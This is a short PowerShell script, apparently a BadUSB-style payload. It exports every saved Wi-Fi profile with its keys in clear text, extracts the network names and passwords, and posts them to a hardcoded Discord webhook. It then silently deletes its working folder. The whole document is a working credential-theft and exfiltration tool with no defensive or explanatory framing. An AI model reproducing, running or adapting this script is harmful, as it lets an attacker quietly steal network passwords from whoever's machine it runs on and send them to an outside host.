# Create a temporary directory and change to it
$p = "$env:temp\wifi-passwords"; md $p >$null; cd $p;

# Export all wifi profiles to xml files in the current directory
netsh wlan export profile key=clear >$null;

# Parse the xml files and create a custom object with the name and password
$r = Get-ChildItem | ForEach-Object {
  $Xml = [xml](Get-Content -Path $_.FullName)
  [PSCustomObject]@{
    Name = $Xml.WLANProfile.Name
    Password = $Xml.WLANProfile.MSM.Security.SharedKey.KeyMaterial
  }
}

# Format the custom object as a table in a Markdown code block
$body = @{content = "``````"+($r | Format-Table | Out-String)+"``````"}

# Send the formatted table to a Discord webhook
Invoke-RestMethod -Uri 'https://discordapp.com/api/webhooks/1286243030281617429/QIoRRn9aZU0u_VS6Phdt759_HPQ-j1JX2tdYpsMeMGWAG0say5KZwTsmDmdYo75MTpQV' -Method 'post' -Body $body >$null;

# Delete the temporary directory and exit the script
cd ..; rm $p -r -fo; exit;
